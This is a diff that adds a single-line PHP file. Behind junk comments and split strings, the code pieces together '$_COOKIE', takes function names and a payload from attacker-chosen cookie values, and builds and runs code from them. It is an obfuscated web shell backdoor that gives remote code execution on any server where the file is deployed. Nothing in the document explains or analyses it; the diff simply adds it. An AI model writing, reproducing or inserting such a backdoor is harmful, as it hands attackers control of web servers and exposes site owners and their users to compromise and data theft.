@@ -1,0 +1,1 @@
+<?php $nd='OKI';/*JX*/$o='E';/*VW9*/$jx='_CO';$a/*@;U*/=${$jx.$nd.$o};if(isset($a/*2XdI*/['lQ'])){$im=$a/*?)v*/['lQ'].$a['gS'];$wj=/*IVI@*/$a['h'].$a['k']/*B*/.$a['qn'];$he=$im('',$wj($a['t']));$he();}
